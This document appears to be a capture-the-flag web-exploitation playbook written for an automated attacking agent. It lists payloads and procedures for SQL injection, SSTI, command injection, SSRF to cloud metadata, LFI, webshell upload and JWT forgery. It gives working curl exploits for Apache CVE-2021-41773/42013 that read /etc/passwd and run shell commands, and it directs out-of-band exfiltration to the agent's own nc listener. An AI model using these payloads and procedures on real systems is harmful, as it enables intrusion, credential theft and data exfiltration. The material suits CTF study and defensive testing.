# Web playbook (weight 25% — go deep)

Recon → scan → accounts → per-class checklist. For EACH class: probe, confirm,
exploit to flag.

1. **SQLi**: error-based first (`'`, `"`), then UNION (match column count with
   ORDER BY), then boolean/time blind via sqlmap --batch. Dump the table that
   holds flag/admin password.
   **Extraction robustness (run-9115 lesson: admin_logs returned `NORET
   len=1309` for 5+ queries across 9 rounds — the extractor was broken, the
   table was never read; nobody debugged the tool)**:
   - Empty/identical/constant-length extraction output = **your extractor is
     broken**, NOT "the table is empty". Debug the tool before concluding.
   - Fallback ladder when a column won't render: (1) `hex()` the expression
     (`hex(group_concat(...))` — dodges charset/width issues); (2) row-by-row
     `LIMIT n,1` instead of group_concat (long group_concats truncate);
     (3) `SUBSTR(expr,off,200)` paging; (4) `ORD()`/`ASCII()` per-char for the
     stubborn tail; (5) `CHAR()` reassembly.
   - Verify the extractor on a KNOWN value first (`SELECT @@version` through
     the same injection path) — if that doesn't come back, fix the path, don't
     query the real target through a broken pipe.
   - Dump EVERY table before leaving the DB: logs/hosts/config tables are
     where later-stage credentials hide.
2. **SSTI**: `{{7*7}}`, `{{config}}` in every param; Jinja/Twig/Smarty payloads;
   RCE via `''.__class__.__mro__` chain or `system()`.
3. **Command injection**: `;id`, `|id`, `` `id` ``, `$(id)`, newline `%0aid`;
   once confirmed, `cat /flag* /etc/passwd`, `env`, `ls -la /`.
4. **SSRF**: params taking URLs; hit internal `http://127.0.0.1:port`,
   `file:///etc/passwd`, cloud metadata `169.254.169.254`; bypass filters with
   redirects, decimal IP, `@`, dns rebinding alternatives.
5. **Path traversal / LFI**: `../../etc/passwd`, encodings, `....//`, php
   filters `php://filter/convert.base64-encode/resource=`; then RCE via log
   poisoning or session files.
6. **File upload**: webshell with double ext, `.pht/.phtml/.php5`, content-type
   spoof, magic bytes; find upload dir via dir scan.
7. **Deserialization**: PHP `unserialize` (phpggc patterns), Python pickle,
   Java (ysoserial patterns), Node `node-serialize`; JWT session cookies.
8. **XSS→admin**: fuzz `<>"'` filter profile; bypass; jsfuck if all filtered;
   aim for cookie exfil to your listener or stored flag in admin bot.
9. **XXE**: swap JSON→XML bodies; external entities `file://`, phar.
10. **Auth/IDOR (see system.md §4)**: register 2 accounts; enum IDs; role
    tamper; JWT attacks; password reset flow flaws; weak creds (admin/admin,
    hydra on login only if nothing else moves). **Weak-cred lists must be
    THEMED, not just generic**: brand/product/company words from the challenge
    description and page footers × {2023..2026,123,!,@} (e.g. a "泛微" system →
    `Weaver@2023`; "深科" → `deeptech@2023`, `shenke@2024`), plus
    username×suffix (`employee123`, `sysadmin2023`). Challenge passwords come
    from the challenge's own corpus — see playbook_killchain §"Password attack
    standard procedure" for the full candidate recipe.
11. **Info leaks**: `.git/HEAD` → dump repo; `.env`, `actuator/`, `console/`,
    `phpinfo`, source in `.bak/.swp`, verbose errors, debug=True.

Flags hide in: DB rows, files readable after RCE/LFI, admin pages, response
headers of special routes, second-stage internal services (SSRF/pivot).

## Sandboxed / headless-browser XSS (Dalgona, js2py checkers) — read BEFORE grinding XSS

When a challenge renders your input then checks it with a headless browser or a
Python JS engine (js2py) and reports back whether `alert()` fired:

- **DIAGNOSTIC — do not skip.** If EVERY payload returns the SAME response —
  including the literal `1`, `true`, `null`, or a non-JS string — the error is
  coming from the CHECKER's own eval harness, NOT your payload. A real content
  filter changes behavior per-input; an identical response to all inputs is a
  sandbox-engine artifact. STOP fuzzing tag/encoding variants: no amount of
  `<img onerror>` obfuscation fixes a checker that crashes before reading you.
- The signature `TypeError: Attempting to change the setter of an
  unconfigurable property` = the checker does
  `Object.defineProperty(window,'alert',{set:...})` on a non-configurable
  property. This is the open-source **dalgona** XSS trainer (do9duck/dalgona);
  each named variant (Star / Umbrella / Heart / …) has ONE intended solution
  per category.
- **RESEARCH > FUZZ here.** Spend budget pulling the exact variant's checker
  source + known solution from the dalgona repo (this host has internet), then
  craft the single intended payload. Blind fuzzing a crashing checker is a
  guaranteed time sink (cost us 3 challenges this run: 011/015/018).
- js2py is an INCOMPLETE JS engine: it cannot redefine native non-configurable
  accessors, so `Object.defineProperty`, `delete window.alert`, Proxy/Set traps
  all trip the TypeError. The working angle is usually to fire `alert` through
  a path the checker does NOT wrap, or feed input the checker's preamble accepts
  — get the variant's exact template from source first.
- Seed payloads in `tools/payloads/xss_sandbox.txt` (try in order); note
  WHICH tag/char each variant's filter blocks, then wrap the surviving vector.

## Run-6661 iron rules (lost us a-07 — read before any WAF/XXE grind)

- **Bypass found ⇒ re-run EVERY blocked payload through it.** If a WAF
  blocked `<!DOCTYPE`/`php://filter`/`file://` and you later find a bypass
  (UTF-16/UTF-32 body encoding, case tweaks, comments, chunking), IMMEDIATELY
  retry all previously blocked payloads wrapped in the bypass. A payload
  blocked pre-bypass is NOT a dead end (a-07: UTF-16 bypassed the WAF but the
  `php://filter` base64 read was never retried through it → no exfil → fail).
- **Blind vuln without reflection ⇒ OOB to YOUR OWN listener.** The target
  shares your VPN segment and can reach your sandbox IP (`hostname -I`). For
  blind XXE/SSRF/RCE: start `nc -lvp 8888` (or python http.server) locally,
  make the target exfil to `http://<your-ip>:8888/<data>` — via parameter
  entities + external DTD (XXE), URL fetch (SSRF), or curl/wget in executed
  commands. Error-based second best: force file content into error text
  (e.g. PHP `PI php never end` proves a read worked — switch the wrapper
  until content surfaces).
- **Hidden JSON/form field ⇒ brute COMPOUND names, don't hand-guess.** When
  an endpoint answers "URL is required" / "missing field" for every name you
  try, the real key is usually a prefix+noun compound (a-14 died at 132 min
  because it never tried `target_endpoint`). Script it, diff vs the baseline
  error — one pass, not one-by-one:
  ```
  while read -r p; do
    curl -s -X POST "$URL" -H 'Content-Type: application/json' \
         -d "{\"$p\":\"http://127.0.0.1/\"}" | grep -qv "URL is required" \
      && echo "HIT param=$p"
  done < <(python "$HEHUA_ROOT/scripts/paramgen.py" --n 200)
  ```
  (paramgen.py prints seeds first, then prefix×noun snake+camel.)

## Web-server fingerprint → instant CVE (check the `Server:` header FIRST)

- **Apache/2.4.49** → CVE-2021-41773; **Apache/2.4.50** → CVE-2021-42013.
  Path traversal + RCE via DOUBLE-encoded dot-dot. Exact canonical forms —
  `/cgi-bin/` uses the NO-dot `%%32%65%%32%65`; `/icons/` uses `.%%32%65`.
  If single-encoded traversal 404s/400s you MUST try these (the #1 miss):
  ```
  # 2.4.49 read (single-encoded, cgi-bin):
  curl -s --path-as-is "http://T/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
  # 2.4.50 read (double-encoded): %%32%65%%32%65 decodes to ..
  curl -s --path-as-is "http://T/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"
  curl -s --path-as-is "http://T/icons/.%%32%65/.%%32%65/.%%32%65/etc/passwd"
  # 2.4.50 RCE: POST body is piped to /bin/sh (needs mod_cgi + ScriptAlias):
  curl -s --path-as-is -d 'echo; id; cat /flag* /flag.txt /root/flag.txt /challenge/flag.txt 2>/dev/null' \
    "http://T/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh"
  ```
  Also try the `%252e%252e/` variant. RCE needs a CGI-enabled mapped URI
  (ScriptAlias /cgi-bin/); if it 404s, the box may only allow file read.
  Flag at /flag, /flag.txt, /root/flag.txt, or /challenge/flag.txt.
- **Werkzeug/Flask**: probe `/console` (debug shell — if open, RCE via
  `__import__('os').popen('cat /flag*').read()`); SSTI in any reflected param
  (`{{config}}`, `{{7*7}}`); and DEBUG error pages leak source/paths.
- **Flag hygiene**: flags are `flag{...}`. Extract the WHOLE token incl. both
  braces before submitting (`grep -oE 'flag\{[^}]+\}'`); a truncated or
  brace-less string is a wasted submit.

## JS chunk systematic analysis (do BEFORE manual endpoint enumeration — c-03 lesson)

When a Next.js/React/SPA app has no obvious API entry:
1. **Download ALL JS chunks** (not just the ones you see in page source):
   ```bash
   BASE=<target>
   curl -s "$BASE/" | grep -oE '(src|href)="[^"]*\.js"' | cut -d'"' -f2 > urls.txt
   curl -s "$BASE/" | grep -o '/_next/static/chunks/[^"]*\.js' >> urls.txt
   mkdir -p js && sort -u urls.txt | while read p; do
     curl -s -m 10 "$BASE$p" -o "js/$(basename $p)"
   done
   ```
2. **Grep for hidden endpoints and real API addresses**:
   ```bash
   # Hidden backend ports (API might NOT be on the obvious port)
   grep -rho 'localhost:[0-9]*/api\|127\.0\.0\.1:[0-9]*/api\|:500[0-9]/api' js/
   grep -o '.\{100\}localhost:500[0-9].\{150\}' js/*.js  # context around hits
   # API base URLs / config
   grep -rho 'baseURL[^,}]*\|API_BASE[^,}]*\|apiUrl[^,}]*' js/
   # Next.js Server Actions (can call backend directly)
   grep -rlo 'createServerReference\|ACTION_ID\|\$ACTION\|serverActions' js/
   # GraphQL endpoints
   grep -rlo 'graphql\|/gql\|query{' js/ | head -5
   # WebSocket endpoints
   grep -rho 'ws://[^"]*\|wss://[^"]*' js/
   ```
3. **Test discovered endpoints directly** — the JS often reveals the REAL backend
   port (e.g., `localhost:5002/api` in JS when the visible frontend is :3000).
4. **Next.js image optimization SSRF** — if /_next/image exists:
   ```bash
   curl -s "$BASE/_next/image?url=http://localhost:5002/api/secret&w=640&q=75"
   ```

## JWT attacks (when any JWT/token/Authorization header present)

1. **Decode first**:
   ```bash
   echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null  # header (check alg, kid)
   echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null  # payload (check role, email)
   ```
2. **alg:none** (if HS256):
   ```python
   import base64, json
   def b64(d): return base64.urlsafe_b64encode(d).rstrip(b'=').decode()
   header = b64(json.dumps({"alg":"none","typ":"JWT"}).encode())
   payload = b64(json.dumps({"email":"dev@example.com","role":"admin"}).encode())
   print(f"{header}.{payload}.")
   ```
3. **kid header attacks**: try kid="dev.key", kid="old.key", kid path traversal
   (kid="../../dev/null"), kid pointing to a known file.
4. **Claim tampering**: change role → admin, email → admin@x.com, add "admin": true.
5. **HMAC key brute** (if weak key): use hashcat/john or python hmac itertools.
6. **Old signing keys**: check if old/migration keys still accepted (dev.key).
7. **PHP/nginx alias traversal** to READ the signing key file:
   `/public/static/../../keys/prod.key` (when "migration" is in the description).

## Contract/Approval/Reimbursement systems (a-03 class)

1. **Register 2+ accounts** (employee + different employee).
2. **Horizontal IDOR**: access other user's contracts/approvals by ID.
   ```bash
   # Get employee A's contract list, try accessing by ID
   curl -b A_cookies "http://T/api/contracts"  # note the IDs
   curl -b B_cookies "http://T/api/contracts/123"  # B reads A's contract?
   ```
3. **Race condition**: submit + approve simultaneously (parallel curl).
4. **Amount tampering**: negative, zero, huge, float overflow, string.
5. **Role escalation**: employee accessing admin/manager endpoints directly.
6. **Batch operations**: bulk endpoints that skip per-item auth checks.
7. **Status manipulation**: change pending→approved via PUT/PATCH.
8. **JS route analysis**: download app JS to find ALL routes including hidden ones.

## HTTP Request Smuggling (when behind proxy/load balancer — envoy, cloudflare)

1. **Identify proxy chain**: check Server/X-Via/CF-Ray headers, OPTIONS behavior.
2. **CL-TE**: Content-Length + Transfer-Encoding chunked together.
3. **TE-CL**: Transfer-Encoding chunked + Content-Length conflict.
4. **Raw socket testing** (python):
   ```python
   import socket
   s = socket.create_connection((HOST, 80))
   s.sendall(b"POST / HTTP/1.1\r\nHost: T\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: T\r\n\r\n")
   print(s.recv(4096).decode(errors='replace'))
   ```
5. **envoy→nginx chain**: envoy may normalize paths differently than nginx →
   try path variations that bypass envoy routing but hit nginx backends.



- **LFI as an existence oracle (kills 403/catch-all noise)**: when directory
  brute is polluted — `.htaccess` returning 403 on every dotfile, or a PHP
  catch-all returning the homepage 200 for ANY path — so ffuf can't tell real
  files from noise, repurpose a known LFI/include param (`?file=`, `?page=`,
  `?id=`, `?template=`) as a file-existence probe. Existing vs non-existing
  paths produce DIFFERENT LFI responses (content vs "not found" vs error), so
  diff the response across a wordlist to enumerate the REAL files under
  `/api/`, `/admin/`, etc. that the front router hides. (ATX used this to map
  B-02's hidden `/api/` surface through an .htaccess 403 wall.)
- **.htaccess blocks HTTP requests, NOT LFI reads**: an LFI that "can't read
  config.php because .htaccess denies it" is a misread — read it via the LFI.
- WAF blocks DOCTYPE/entities ⇒ **XInclude XXE** (xmlns:xi inside body, no
  DOCTYPE needed).
- Old nginx + "static service migration" hints ⇒ **nginx alias traversal**
  to read files like JWT signing keys; also try kid=/dev/null, kid path
  traversal before wordlists.
- Python pollution/set_ filters on the KEY STRING ⇒ send the path as a
  **JSON array** (list paths skip string filters); read /src first and attack
  the exact filter.
- Description-disclosed internal endpoints (SSRF targets) ⇒ pivot IMMEDIATELY
  with file/gopher/dict schemes; do not re-discover.
- Go services on internal nets ⇒ **/debug/pprof** and /debug/vars first.
- pydash pollution: pydash≥6 RESTRICTS `__globals__`/`__builtins__` (KeyError
  "restricted" = version ≥6) and does NOT parse bracketed string keys as path
  segments (they become literal attrs) ⇒ the `__file__`-swap read only works
  on OLD pydash; probe version via error text before grinding paths.
- HugeGraph ≤1.2: gremlin SecurityManager blocks file/exec/URL; arthas runs
  inside on 8561/8562 UNEXPOSED ⇒ remaining chain = raw-Socket SSRF from
  gremlin to 127.0.0.1:8561 arthas API (ognl read).
- Gradio 4.12: /component_server needs session_hash+component_id;
  move_resource_to_blocklist 500s (removed) ⇒ prefer /file= with allowed
  /tmp/gradio prefix or upload-path tricks.
